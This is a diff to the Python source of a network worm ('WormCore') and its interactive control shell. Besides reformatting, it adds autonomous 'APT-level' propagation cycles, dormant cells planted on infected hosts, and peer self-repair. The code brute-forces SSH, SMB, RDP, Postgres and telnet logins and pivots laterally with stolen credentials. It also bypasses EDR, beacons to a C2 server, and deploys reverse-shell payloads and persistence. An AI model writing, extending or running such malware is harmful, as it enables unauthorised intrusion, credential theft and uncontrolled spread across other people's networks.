+            elif service == "smb":
                 from impacket.smbconnection import SMBConnection
+
                 conn = SMBConnection(ip, ip, sess_port=port)
                 conn.login(username, password)
                 conn.close()
                 return True
-            elif service == 'postgres':
+            elif service == "postgres":
                 import psycopg2
-                conn = psycopg2.connect(host=ip, port=port, user=username, password=password, connect_timeout=5, dbname='postgres')
+
+                conn = psycopg2.connect(
+                    host=ip,
+                    port=port,
+                    user=username,
+                    password=password,
+                    connect_timeout=5,
+                    dbname="postgres",
+                )
                 conn.close()
                 return True
-            elif service == 'rdp':
+            elif service == "rdp":
                 import subprocess
-                result = subprocess.run(['xfreerdp', f'/v:{ip}', f'/u:{username}', f'/p:{password}', '/cert:ignore', '/auth-only', '/timeout:5000'], capture_output=True, timeout=10)
+
+                result = subprocess.run(
+                    [
+                        "xfreerdp",
+                        f"/v:{ip}",
+                        f"/u:{username}",
+                        f"/p:{password}",
+                        "/cert:ignore",
+                        "/auth-only",
+                        "/timeout:5000",
+                    ],
+                    capture_output=True,
+                    timeout=10,
+                )
                 return result.returncode == 0
-            elif service == 'telnet':
+            elif service == "telnet":
                 import telnetlib
+
                 tn = telnetlib.Telnet(ip, port, timeout=5)
                 tn.read_until(b"login: ", timeout=3)
                 tn.write(username.encode() + b"\n")
@@ -877,7 +1101,9 @@ class WormCore:
                 tn.write(password.encode() + b"\n")
                 resp = tn.read_some()
                 tn.close()
-                return b'incorrect' not in resp.lower() and b'failed' not in resp.lower()
+                return (
+                    b"incorrect" not in resp.lower() and b"failed" not in resp.lower()
+                )
         except Exception:
             return False
         return False
@@ -887,7 +1113,7 @@ class WormCore:
         if not self.exploit_manager.msf_client:
             return None
         for key, info in self.exploit_manager.msf_client.EXPLOIT_MAP.items():
-            if info['msf_path'] == msf_module:
+            if info["msf_path"] == msf_module:
                 return key
         return None
 
@@ -902,7 +1128,7 @@ class WormCore:
             discovered = self.cred_manager.get_discovered_credentials()
             if discovered:
                 creds_list = [
-                    {'username': u, 'password': p, 'type': 'password'}
+                    {"username": u, "password": p, "type": "password"}
                     for u, p in discovered
                 ]
 
@@ -916,29 +1142,36 @@ class WormCore:
 
         for cred_info in creds_list[:3]:
             credentials = {
-                'username': cred_info.get('username', ''),
-                'password': cred_info.get('password', ''),
-                'hash': cred_info.get('hash', ''),
-                'ssh_key': cred_info.get('ssh_key', ''),
+                "username": cred_info.get("username", ""),
+                "password": cred_info.get("password", ""),
+                "hash": cred_info.get("hash", ""),
+                "ssh_key": cred_info.get("ssh_key", ""),
             }
 
             for target_ip in uninfected[:5]:
                 target_info = None
                 for host in self.scan_results:
-                    if host['ip'] == target_ip:
+                    if host["ip"] == target_ip:
                         target_info = host
                         break
 
                 if not target_info:
                     continue
 
-                source_host = {'ip': source_ip, 'os_guess': source_target.get('os_guess', 'Unknown')}
+                source_host = {
+                    "ip": source_ip,
+                    "os_guess": source_target.get("os_guess", "Unknown"),
+                }
 
-                logger.info(f"Lateral movement: {source_ip} -> {target_ip} as {credentials.get('username', '?')}")
-                self.stats['lateral_movements'] += 1
+                logger.info(
+                    f"Lateral movement: {source_ip} -> {target_ip} as {credentials.get('username', '?')}"
+                )
+                self.stats["lateral_movements"] += 1
 
                 if self.dry_run:
-                    logger.info(f"[DRY RUN] Would attempt lateral movement to {target_ip}")
+                    logger.info(
+                        f"[DRY RUN] Would attempt lateral movement to {target_ip}"
+                    )
                     continue
 
                 success, result = self.lateral_movement.move(
@@ -946,27 +1179,33 @@ class WormCore:
                 )
 
                 if success:
-                    self.stats['lateral_success'] += 1
-                    logger.success(f"Lateral movement succeeded: {source_ip} -> {target_ip}")
+                    self.stats["lateral_success"] += 1
+                    logger.success(
+                        f"Lateral movement succeeded: {source_ip} -> {target_ip}"
+                    )
 
                     if target_ip not in self.infected_hosts:
                         self.infected_hosts.add(target_ip)
-                        self.stats['infections'] += 1
+                        self.stats["infections"] += 1
 
                         if self.knowledge_graph:
-                            self.knowledge_graph.mark_infected(target_ip, result.get('technique', 'lateral'))
+                            self.knowledge_graph.mark_infected(
+                                target_ip, result.get("technique", "lateral")
+                            )
 
                         # Register with Host Monitor (unique payload)
                         if self.host_monitor:
                             self.host_monitor.register_host(
                                 target_ip,
-                                os_guess=target_info.get('os_guess', 'Unknown'),
-                                ports=target_info.get('open_ports', []),
-                                exploit_method=f"lateral_{result.get('technique', 'unknown')}"
+                                os_guess=target_info.get("os_guess", "Unknown"),
+                                ports=target_info.get("open_ports", []),
+                                exploit_method=f"lateral_{result.get('technique', 'unknown')}",
                             )
                             self.host_monitor.record_lateral_movement(
-                                source_ip, target_ip,
-                                result.get('technique', 'unknown'), True
+                                source_ip,
+                                target_ip,
+                                result.get("technique", "unknown"),
+                                True,
                             )
 
                         self.real_world_agent.provide_feedback(target_info, True, 30)
@@ -974,8 +1213,10 @@ class WormCore:
                     # Record lateral movement on source host
                     if self.host_monitor:
                         self.host_monitor.record_lateral_movement(
-                            source_ip, target_ip,
-                            result.get('technique', 'unknown'), True
+                            source_ip,
+                            target_ip,
+                            result.get("technique", "unknown"),
+                            True,
                         )
 
                     return
@@ -992,7 +1233,9 @@ class WormCore:
         # Multiple replay passes for faster convergence
         n_passes = min(3, max(1, len(memory) // 64))
 
-        logger.info(f"Online learning: {len(memory)} experiences, batch={batch_size}, passes={n_passes}")
+        logger.info(
+            f"Online learning: {len(memory)} experiences, batch={batch_size}, passes={n_passes}"
+        )
 
         for _ in range(n_passes):
             self.rl_agent.replay(batch_size=batch_size)
@@ -1006,7 +1249,7 @@ class WormCore:
 
         # Save checkpoint periodically
         try:
-            checkpoint_path = self.config.ml.rl_agent_path.replace('.h5', '_online.h5')
+            checkpoint_path = self.config.ml.rl_agent_path.replace(".h5", "_online.h5")
             self.rl_agent.save(checkpoint_path)
         except Exception as e:
             logger.debug(f"Failed to save online checkpoint: {e}")
@@ -1021,29 +1264,32 @@ class WormCore:
             return
 
         uninfected = [
-            h for h in self.scan_results
-            if h['ip'] not in self.infected_hosts and h['ip'] not in self.failed_targets
+            h
+            for h in self.scan_results
+            if h["ip"] not in self.infected_hosts and h["ip"] not in self.failed_targets
         ]
 
         if not uninfected:
             return
 
-        logger.info(f"Credential pivot: trying {len(discovered)} creds on {len(uninfected)} hosts")
+        logger.info(
+            f"Credential pivot: trying {len(discovered)} creds on {len(uninfected)} hosts"
+        )
 
         for username, password in discovered[:5]:
             for host in uninfected:
-                ip = host['ip']
-                ports = host.get('open_ports', [])
+                ip = host["ip"]
+                ports = host.get("open_ports", [])
 
                 service = None
                 if 22 in ports:
-                    service = 'ssh'
+                    service = "ssh"
                 elif 445 in ports:
-                    service = 'smb'
+                    service = "smb"
                 elif 3389 in ports:
-                    service = 'rdp'
+                    service = "rdp"
                 elif 80 in ports or 8080 in ports:
-                    service = 'http'
+                    service = "http"
 
                 if not service:
                     continue
@@ -1054,27 +1300,82 @@ class WormCore:
                     continue
 
                 # Try actual login
-                success = self._try_service_login(ip, ports[0] if ports else 22, service, username, password)
+                success = self._try_service_login(
+                    ip, ports[0] if ports else 22, service, username, password
+                )
                 if success:
                     logger.success(f"Pivot success: {username} -> {ip} ({service})")
                     if ip not in self.infected_hosts:
                         self.infected_hosts.add(ip)
-                        self.stats['infections'] += 1
+                        self.stats["infections"] += 1
                         if self.knowledge_graph:
                             self.knowledge_graph.mark_infected(ip, f"pivot_{service}")
                     self.cred_manager.record_attempt(ip, username, True)
                 else:
                     self.cred_manager.record_attempt(ip, username, False)
 
+    def _run_adaptive_cycle(self, iteration: int):
+        """Run the full Adaptive Cycle (APT-level autonomous propagation)"""
+        if not self.adaptive_cycle:
+            return
+
+        logger.info(f"\n{'=' * 60}")
+        logger.info(f"ADAPTIVE CYCLE #{self.adaptive_cycle.cycle_count + 1}")
+        logger.info(f"{'=' * 60}")
+
+        # Gather data for the cycle
+        scan_results = self.scan_results or []
+        exploit_results = {}
+        available_exploits = []
+
+        if self.exploit_manager:
+            available_exploits = [e.name for e in self.exploit_manager.exploits[:10]]
+
+        # Run the adaptive cycle
+        cycle_result = self.adaptive_cycle.run_cycle(
+            scan_results=scan_results,
+            exploit_results=exploit_results,
+            available_exploits=available_exploits,
+        )
+
+        # Log recommendations
+        for rec in cycle_result.get("recommendations", []):
+            logger.info(f"  → {rec}")
+
+        # Deploy dormant cells on newly infected hosts
+        if self.dormant_cells and self.infected_hosts:
+            for ip in list(self.infected_hosts)[-3:]:  # Deploy on last 3 infected
+                if ip not in [c["host_ip"] for c in self.dormant_cells.cells.values()]:
+                    cell_id = self.dormant_cells.deploy_cell(ip, max_dormant_days=7)
+                    logger.info(f"  Dormant cell deployed: {cell_id} on {ip}")
+
+    def _check_distributed_redundancy(self):
+        """Check peer health and repair dead peers"""
+        if not self.distributed_redundancy:
+            return
+
+        # Add infected hosts as peers
+        for ip in self.infected_hosts:
+            if ip != get_local_ip():
+                self.distributed_redundancy.add_peer(ip)
+
+        # Check and repair
+        repairs = self.distributed_redundancy.check_and_repair()
+        if repairs:
+            for repair in repairs:
+                logger.info(
+                    f"  Distributed repair: {repair['action']} on {repair.get('peer_ip', '?')}"
+                )
+
     def _post_exploitation_cleanup(self, ip: str, target: Dict):
         """
         Post-exploitation cleanup: anti-forensics, EDR bypass, memory execution
         Called after each successful exploitation
         """
-        os_guess = target.get('os_guess', 'Unknown').lower()
+        os_guess = target.get("os_guess", "Unknown").lower()
 
         # 1. EDR detection and bypass (Windows)
-        if 'windows' in os_guess:
+        if "windows" in os_guess:
             try:
                 edr_detected = self.edr_bypass.detect_edr()
                 if edr_detected:
@@ -1083,13 +1384,17 @@ class WormCore:
                     bypass_results = self.edr_bypass.apply_all_bypasses()
                     successful_bypasses = [k for k, v in bypass_results.items() if v]
                     if successful_bypasses:
-                        logger.success(f"EDR bypass successful on {ip}: {successful_bypasses}")
-                        self._detection_events.append({
-                            'type': 'edr_bypass',
-                            'ip': ip,
-                            'techniques': successful_bypasses,
-                            'timestamp': datetime.now().isoformat(),
-                        })
+                        logger.success(
+                            f"EDR bypass successful on {ip}: {successful_bypasses}"
+                        )
+                        self._detection_events.append(
+                            {
+                                "type": "edr_bypass",
+                                "ip": ip,
+                                "techniques": successful_bypasses,
+                                "timestamp": datetime.now().isoformat(),
+                            }
+                        )
             except Exception as e:
                 logger.debug(f"EDR bypass failed on {ip}: {e}")
 
@@ -1118,7 +1423,7 @@ class WormCore:
         logger.info("Starting propagation")
         self.running = True
         self.start_time = datetime.now()
-        self.stats['start_time'] = self.start_time
+        self.stats["start_time"] = self.start_time
 
         local_ip = get_local_ip()
         self.infected_hosts.add(local_ip)
@@ -1130,10 +1435,7 @@ class WormCore:
         # Register origin host with Host Monitor
         if self.host_monitor:
             self.host_monitor.register_host(
-                local_ip,
-                os_guess="Local",
-                ports=[],
-                exploit_method="origin"
+                local_ip, os_guess="Local", ports=[], exploit_method="origin"
             )
             # Start continuous monitoring
             self.host_monitor.start_monitoring(interval=30)
@@ -1143,7 +1445,9 @@ class WormCore:
         if self.c2_server:
             try:
                 self.c2_server.run_background()
-                logger.info(f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}")
+                logger.info(
+                    f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}"
+                )
             except Exception as e:
                 logger.warning(f"Failed to start C2 Server: {e}")
 
@@ -1155,7 +1459,8 @@ class WormCore:
                 time.sleep(1)
                 try:
                     import webbrowser
-                    webbrowser.open('http://localhost:5000', new=2)
+
+                    webbrowser.open("http://localhost:5000", new=2)
                 except Exception:
                     pass
             except Exception as e:
@@ -1169,7 +1474,8 @@ class WormCore:
                 time.sleep(1)
                 try:
                     import webbrowser
-                    webbrowser.open('http://localhost:5001', new=2)
+
+                    webbrowser.open("http://localhost:5001", new=2)
                 except Exception:
                     pass
             except Exception as e:
@@ -1177,6 +1483,7 @@ class WormCore:
 
         iteration = 0
         online_learning_interval = 10
+        adaptive_cycle_interval = 5  # Run adaptive cycle every N iterations
 
         while self.running and self.check_safety_constraints():
             iteration += 1
@@ -1188,13 +1495,24 @@ class WormCore:
             if iteration == 1 or iteration % 5 == 0:
                 self.scan_network()
 
+            # ===== ADAPTIVE CYCLE =====
+            if self.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
+                self._run_adaptive_cycle(iteration)
+
             # Credential pivoting
             if self.cred_manager and iteration % 3 == 0:
                 self._credential_pivot_cycle()
 
             # Online learning
-            if self.config.ml.online_learning and iteration % online_learning_interval == 0:
+            if (
+                self.config.ml.online_learning
+                and iteration % online_learning_interval == 0
+            ):
                 self._online_learning_step()
+
+            # Distributed redundancy check
+            if self.distributed_redundancy and iteration % 10 == 0:
+                self._check_distributed_redundancy()
 
             # Select and exploit target
             target = self.select_next_target()
@@ -1206,20 +1524,22 @@ class WormCore:
 
             # Post-exploitation: anti-forensics + EDR bypass on infected hosts
             if self.config.evasion.stealth_mode:
-                self._post_exploitation_cleanup(target['ip'], target)
+                self._post_exploitation_cleanup(target["ip"], target)
 
             # Send C2 beacon for each infected host
-            if self.c2_server and target['ip'] in self.infected_hosts:
+            if self.c2_server and target["ip"] in self.infected_hosts:
                 try:
-                    self.c2_server.process_beacon({
-                        'host_id': target['ip'],
-                        'ip': target['ip'],
-                        'hostname': target.get('hostname', 'unknown'),
-                        'os': target.get('os_guess', 'Unknown'),
-                        'ports': target.get('open_ports', []),
-                        'beacon_type': 'infection',
-                    })
-                    self.stats['c2_beacons'] += 1
+                    self.c2_server.process_beacon(
+                        {
+                            "host_id": target["ip"],
+                            "ip": target["ip"],
+                            "hostname": target.get("hostname", "unknown"),
+                            "os": target.get("os_guess", "Unknown"),
+                            "ports": target.get("open_ports", []),
+                            "beacon_type": "infection",
+                        }
+                    )
+                    self.stats["c2_beacons"] += 1
                 except Exception as e:
                     logger.debug(f"C2 beacon failed: {e}")
 
@@ -1233,7 +1553,7 @@ class WormCore:
 
             self.print_status()
 
-        self.stats['end_time'] = datetime.now()
+        self.stats["end_time"] = datetime.now()
         self.running = False
         logger.success("Propagation complete")
         self.print_final_report()
@@ -1252,15 +1572,23 @@ class WormCore:
         print(f"  Discovered: {self.stats['total_hosts_discovered']}")
         print(f"  Vulnerabilities: {self.stats['vulnerabilities_found']}")
         print(f"  Exploit Chains: {self.stats['exploit_chains_built']}")
-        print(f"  Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}")
-        print(f"  Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}")
+        print(
+            f"  Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
+        )
+        print(
+            f"  Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
+        )
         print(f"  Credentials Discovered: {self.stats['credentials_discovered']}")
         print(f"  C2 Beacons: {self.stats['c2_beacons']}")
         print(f"  Polymorphic Mutations: {self.stats['polymorphic_mutations']}")
 
-        total_attempts = self.stats['infections'] + self.stats['failed_exploits']
-        success_rate = self.stats['infections'] / total_attempts * 100 if total_attempts > 0 else 0
-        print(f"  Success Rate: {self.stats['infections']}/{total_attempts} ({success_rate:.1f}%)")
+        total_attempts = self.stats["infections"] + self.stats["failed_exploits"]
+        success_rate = (
+            self.stats["infections"] / total_attempts * 100 if total_attempts > 0 else 0
+        )
+        print(
+            f"  Success Rate: {self.stats['infections']}/{total_attempts} ({success_rate:.1f}%)"
+        )
 
         if self.start_time:
             elapsed = datetime.now() - self.start_time
@@ -1268,29 +1596,65 @@ class WormCore:
 
         if self.knowledge_graph:
             kg_stats = self.knowledge_graph.get_statistics()
-            print(f"  Knowledge Graph: {kg_stats['hosts']} hosts, {kg_stats['edges']} edges")
+            print(
+                f"  Knowledge Graph: {kg_stats['hosts']} hosts, {kg_stats['edges']} edges"
+            )
 
         # Host Monitor dashboard
         if self.host_monitor:
             overview = self.host_monitor.get_network_overview()
-            print(f"  Host Monitor: {overview['total_hosts']} hosts, "
-                  f"avg health {overview['avg_health']:.0f}%, "
-                  f"{overview['unique_payloads']} unique payloads, "
-                  f"{overview['total_repairs']} repairs")
+            print(
+                f"  Host Monitor: {overview['total_hosts']} hosts, "
+                f"avg health {overview['avg_health']:.0f}%, "
+                f"{overview['unique_payloads']} unique payloads, "
+                f"{overview['total_repairs']} repairs"
+            )
+
+        # APT-Level Adaptive Cycle status
+        if self.adaptive_cycle:
+            apt_status = self.adaptive_cycle.get_full_status()
+            print(f"\n  {'=' * 56}")
+            print(f"  APT-LEVEL ADAPTIVE CYCLE STATUS")
+            print(f"  {'=' * 56}")
+            print(f"  Cycle Count: {apt_status['cycle_count']}")
+            recon = apt_status["predictive_recon"]
+            print(
+                f"  Predictive Recon: {recon['hosts_analyzed']} hosts analyzed, "
+                f"{recon['predictions_made']} predictions made"
+            )
+            selector = apt_status["exploit_selector"]
+            print(
+                f"  Adaptive Exploit: {selector['total_attempts']} attempts, "
+                f"{selector['q_table_entries']} Q-table entries"
+            )
+            redundancy = apt_status["distributed_redundancy"]
+            print(
+                f"  Distributed Mesh: {redundancy['heartbeat']['active_peers']} active, "
+                f"{redundancy['heartbeat']['dead_peers']} dead"
+            )
+            mimicry = apt_status["traffic_mimicry"]
+            print(f"  Traffic Mimicry: {mimicry['active_protocol']} protocol")
+            poly = apt_status["semantic_polymorphism"]
+            print(f"  Semantic Polymorphism: {poly['unique_variants']} variants")
+            cells = apt_status["dormant_cells"]
+            print(
+                f"  Dormant Cells: {cells['dormant']} dormant, "
+                f"{cells['active']} active, {cells['total_cells']} total"
+            )
 
         print(f"{'-' * 60}\n")
 
     def print_final_report(self):
         """Print final statistics and generate audit report"""
-        self.stats['end_time'] = self.stats.get('end_time', datetime.now())
+        self.stats["end_time"] = self.stats.get("end_time", datetime.now())
         print(f"\n{'=' * 60}")
         print("FINAL REPORT")
         print(f"{'=' * 60}")
         print(f"Start: {self.stats['start_time']}")
         print(f"End: {self.stats['end_time']}")
 
-        if self.stats['start_time'] and self.stats['end_time']:
-            duration = self.stats['end_time'] - self.stats['start_time']
+        if self.stats["start_time"] and self.stats["end_time"]:
+            duration = self.stats["end_time"] - self.stats["start_time"]
             print(f"Duration: {duration}")
 
         print(f"\nInfections: {self.stats['infections']}")
@@ -1299,13 +1663,17 @@ class WormCore:
         print(f"Hosts Discovered: {self.stats['total_hosts_discovered']}")
         print(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
         print(f"Exploit Chains Built: {self.stats['exploit_chains_built']}")
-        print(f"Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}")
-        print(f"Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}")
+        print(
+            f"Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
+        )
+        print(
+            f"Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
+        )
         print(f"Credentials Discovered: {self.stats['credentials_discovered']}")
         print(f"C2 Beacons: {self.stats['c2_beacons']}")
         print(f"Polymorphic Mutations: {self.stats['polymorphic_mutations']}")
 
-        total = self.stats['infections'] + self.stats['failed_exploits']
+        total = self.stats["infections"] + self.stats["failed_exploits"]
         if total > 0:
             print(f"Success Rate: {self.stats['infections'] / total * 100:.1f}%")
 
@@ -1345,9 +1713,19 @@ class WormCore:
         # Generate audit report
         if self.audit_generator:
             try:
-                exploit_stats = self.exploit_manager.get_statistics() if hasattr(self.exploit_manager, 'get_statistics') else {}
-                cred_stats = self.cred_manager.get_statistics() if self.cred_manager else {}
-                lm_stats = self.lateral_movement.get_statistics() if self.lateral_movement else {}
+                exploit_stats = (
+                    self.exploit_manager.get_statistics()
+                    if hasattr(self.exploit_manager, "get_statistics")
+                    else {}
+                )
+                cred_stats = (
+                    self.cred_manager.get_statistics() if self.cred_manager else {}
+                )
+                lm_stats = (
+                    self.lateral_movement.get_statistics()
+                    if self.lateral_movement
+                    else {}
+                )
 
                 report_files = self.audit_generator.generate(
                     worm_stats=self.stats,
@@ -1422,13 +1800,15 @@ class InteractiveCLI(cmd.Cmd):
 
     def do_scan(self, arg):
         """Scan the network. Usage: scan [professional|basic]"""
-        use_pro = 'basic' not in arg.lower()
+        use_pro = "basic" not in arg.lower()
         results = self.worm.scan_network(use_professional=use_pro)
         print(f"\nScan complete: {len(results)} hosts found")
         for host in results:
-            vulns = host.get('vulnerabilities', [])
-            chain = host.get('exploit_chain', [])
-            print(f"  {host['ip']} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])} - Vulns: {len(vulns)} - Chains: {len(chain)}")
+            vulns = host.get("vulnerabilities", [])
+            chain = host.get("exploit_chain", [])
+            print(
+                f"  {host['ip']} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])} - Vulns: {len(vulns)} - Chains: {len(chain)}"
+            )
 
     def do_status(self, arg):
         """Show current status"""
@@ -1440,9 +1820,17 @@ class InteractiveCLI(cmd.Cmd):
         print(f"Infected: {len(self.worm.infected_hosts)}")
         print(f"Failed: {len(self.worm.failed_targets)}")
         for host in self.worm.scan_results:
-            ip = host['ip']
-            status = "INFECTED" if ip in self.worm.infected_hosts else "FAILED" if ip in self.worm.failed_targets else "DISCOVERED"
-            print(f"  [{status}] {ip} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])}")
+            ip = host["ip"]
+            status = (
+                "INFECTED"
+                if ip in self.worm.infected_hosts
+                else "FAILED"
+                if ip in self.worm.failed_targets
+                else "DISCOVERED"
+            )
+            print(
+                f"  [{status}] {ip} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])}"
+            )
 
     def do_exploit(self, arg):
         """Exploit a specific target. Usage: exploit <ip>"""
@@ -1453,7 +1841,7 @@ class InteractiveCLI(cmd.Cmd):
 
         target = None
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
+            if host["ip"] == ip:
                 target = host
                 break
 
@@ -1479,15 +1867,15 @@ class InteractiveCLI(cmd.Cmd):
                 for target_ip in reachable:
                     target_info = None
                     for host in self.worm.scan_results:
-                        if host['ip'] == target_ip:
+                        if host["ip"] == target_ip:
                             target_info = host
                             break
                     if target_info:
-                        source = {'ip': ip, 'os_guess': 'Unknown'}
+                        source = {"ip": ip, "os_guess": "Unknown"}
                         tech = self.worm.lateral_movement._select_best_technique(
-                            target_info.get('open_ports', []),
-                            target_info.get('os_guess', 'Unknown'),
-                            {'username': 'root', 'password': 'password'}
+                            target_info.get("open_ports", []),
+                            target_info.get("os_guess", "Unknown"),
+                            {"username": "root", "password": "password"},
                         )
                         print(f"  {target_ip}: best technique = {tech}")
 
@@ -1499,12 +1887,14 @@ class InteractiveCLI(cmd.Cmd):
             return
 
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
-                vulns = host.get('vulnerabilities', [])
+            if host["ip"] == ip:
+                vulns = host.get("vulnerabilities", [])
                 if vulns:
                     print(f"\nVulnerabilities for {ip}:")
                     for v in vulns:
-                        print(f"  [{v.get('severity', 'UNKNOWN')}] {v.get('name', '')} (CVSS: {v.get('cvss', 0)})")
+                        print(
+                            f"  [{v.get('severity', 'UNKNOWN')}] {v.get('name', '')} (CVSS: {v.get('cvss', 0)})"
+                        )
                         print(f"    CVE: {v.get('cve', 'N/A')}")
                         print(f"    {v.get('description', '')}")
                 else:
@@ -1521,12 +1911,14 @@ class InteractiveCLI(cmd.Cmd):
             return
 
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
-                chain = host.get('exploit_chain', [])
+            if host["ip"] == ip:
+                chain = host.get("exploit_chain", [])
                 if chain:
                     print(f"\nExploit chain for {ip}:")
                     for step in chain:
-                        print(f"  Step {step['step']}: [{step['phase']}] {step['name']} ({step.get('cve', 'N/A')})")
+                        print(
+                            f"  Step {step['step']}: [{step['phase']}] {step['name']} ({step.get('cve', 'N/A')})"
+                        )
                 else:
                     print(f"No exploit chain for {ip}")
                 return
@@ -1553,9 +1945,9 @@ class InteractiveCLI(cmd.Cmd):
 
     def do_evasion(self, arg):
         """Show evasion status and statistics"""
-        print(f"\n{'='*60}")
+        print(f"\n{'=' * 60}")
         print("EVASION STATUS")
-        print(f"{'='*60}")
+        print(f"{'=' * 60}")
 
         # IDS Evasion
         if self.worm.ids_evasion:
@@ -1593,7 +1985,7 @@ class InteractiveCLI(cmd.Cmd):
             print(f"    Mutations: {stats['mutations_generated']}")
             print(f"    Unique Signatures: {stats['unique_signatures']}")
 
-        print(f"{'='*60}")
+        print(f"{'=' * 60}")
 
     def do_bruteforce(self, arg):
         """Brute force a specific target. Usage: bruteforce <ip> [service]"""
@@ -1607,7 +1999,7 @@ class InteractiveCLI(cmd.Cmd):
 
         target = None
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
+            if host["ip"] == ip:
                 target = host
                 break
 
@@ -1620,7 +2012,9 @@ class InteractiveCLI(cmd.Cmd):
             if results:
                 print(f"\nBrute force successful on {ip}:")
                 for r in results:
-                    print(f"  {r.get('service', '?')}:{r.get('username', '?')}:{r.get('password', '?')}")
+                    print(
+                        f"  {r.get('service', '?')}:{r.get('username', '?')}:{r.get('password', '?')}"
+                    )
             else:
                 print(f"Brute force failed on {ip}")
         else:
@@ -1638,7 +2032,7 @@ class InteractiveCLI(cmd.Cmd):
 
         target = None
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
+            if host["ip"] == ip:
                 target = host
                 break
 
@@ -1650,7 +2044,9 @@ class InteractiveCLI(cmd.Cmd):
         print("  (Persistence requires active connection - showing available methods)")
         print(f"  OS: {target.get('os_guess', 'Unknown')}")
         print(f"  Available methods for Linux: cron, systemd, bashrc, ssh_keys")
-        print(f"  Available methods for Windows: registry, scheduled_task, startup, service")
+        print(
+            f"  Available methods for Windows: registry, scheduled_task, startup, service"
+        )
 
     def do_deploy(self, arg):
         """Deploy payload on target. Usage: deploy <ip> [type]"""
@@ -1660,11 +2056,11 @@ class InteractiveCLI(cmd.Cmd):
             return
 
         ip = parts[0]
-        payload_type = parts[1] if len(parts) > 1 else 'reverse_shell'
+        payload_type = parts[1] if len(parts) > 1 else "reverse_shell"
 
         target = None
         for host in self.worm.scan_results:
-            if host['ip'] == ip:
+            if host["ip"] == ip:
                 target = host
                 break
 
@@ -1691,7 +2087,9 @@ class InteractiveCLI(cmd.Cmd):
         command = parts[1]
 
         # Check if we have an active connection via payload deployer
-        if self.worm.exploit_manager and hasattr(self.worm.exploit_manager, 'payload_deployer'):
+        if self.worm.exploit_manager and hasattr(
+            self.worm.exploit_manager, "payload_deployer"
+        ):
             pd = self.worm.exploit_manager.payload_deployer
             success, output = pd.execute_command(ip, command)
             if success:
@@ -1715,12 +2113,13 @@ class InteractiveCLI(cmd.Cmd):
 
         hosts = {}
         for host in self.worm.scan_results:
-            hosts[host['ip']] = {
-                'os_guess': host.get('os_guess', 'Unknown'),
-                'open_ports': host.get('open_ports', []),
+            hosts[host["ip"]] = {
+                "os_guess": host.get("os_guess", "Unknown"),
+                "open_ports": host.get("open_ports", []),
             }
 
         from utils.topology_visualizer import TopologyVisualizer
+
         tv = TopologyVisualizer()
 
         lateral_movements = []
@@ -1728,12 +2127,16 @@ class InteractiveCLI(cmd.Cmd):
             for ip in self.worm.host_monitor.hosts:
                 host_state = self.worm.host_monitor.hosts[ip]
                 for lm in host_state.lateral_movement_history:
-                    lateral_movements.append({
-                        'source': ip,
-                        **lm,
-                    })
+                    lateral_movements.append(
+                        {
+                            "source": ip,
+                            **lm,
+                        }
+                    )
 
-        results = tv.generate_all(hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral_movements)
+        results = tv.generate_all(
+            hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral_movements
+        )
         print(f"\nTopology maps generated:")
         for fmt, path in results.items():
             print(f"  {fmt}: {path}")
@@ -1755,9 +2158,9 @@ class InteractiveCLI(cmd.Cmd):
         if self.worm.host_monitor:
             status = self.worm.host_monitor.get_host_status(ip)
             if status:
-                print(f"\n{'='*60}")
+                print(f"\n{'=' * 60}")
                 print(f"HOST DETAILS: {ip}")
-                print(f"{'='*60}")
+                print(f"{'=' * 60}")
                 for k, v in status.items():
                     if isinstance(v, dict):
                         print(f"  {k}:")
@@ -1765,7 +2168,7 @@ class InteractiveCLI(cmd.Cmd):
                             print(f"    {k2}: {v2}")
                     else:
                         print(f"  {k}: {v}")
-                print(f"{'='*60}")
+                print(f"{'=' * 60}")
             else:
                 print(f"Host {ip} not found in monitor")
         else:
@@ -1782,7 +2185,9 @@ class InteractiveCLI(cmd.Cmd):
             if activities:
                 print(f"\nRecent Activity (last {len(activities)}):")
                 for act in activities:
-                    print(f"  [{act['timestamp'][11:19]}] {act['host_ip']:<15} {act['type']:<20} {act['details'][:50]}")
+                    print(
+                        f"  [{act['timestamp'][11:19]}] {act['host_ip']:<15} {act['type']:<20} {act['details'][:50]}"
+                    )
             else:
                 print("No activities recorded yet")
         else:
@@ -1796,7 +2201,9 @@ class InteractiveCLI(cmd.Cmd):
             return
         if self.worm.host_monitor:
             success = self.worm.host_monitor.trigger_self_healing(ip)
-            print(f"Self-healing on {ip}: {'SUCCESS' if success else 'FAILED or not needed'}")
+            print(
+                f"Self-healing on {ip}: {'SUCCESS' if success else 'FAILED or not needed'}"
+            )
         else:
             print("Host Monitor not available")
 
@@ -1806,11 +2213,13 @@ class InteractiveCLI(cmd.Cmd):
             prop_map = self.worm.host_monitor.get_propagation_map()
             print(f"\nPropagation Map ({len(prop_map)} hosts):")
             for ip, info in prop_map.items():
-                lmovements = len(info.get('lateral_movements', []))
-                print(f"  {ip:<18} {info['os']:<12} {info['status']:<10} "
-                      f"Payload: {info['payload_variant']:<6} "
-                      f"Creds: {info['credentials_found']:<3} "
-                      f"Lateral: {lmovements}")
+                lmovements = len(info.get("lateral_movements", []))
+                print(
+                    f"  {ip:<18} {info['os']:<12} {info['status']:<10} "
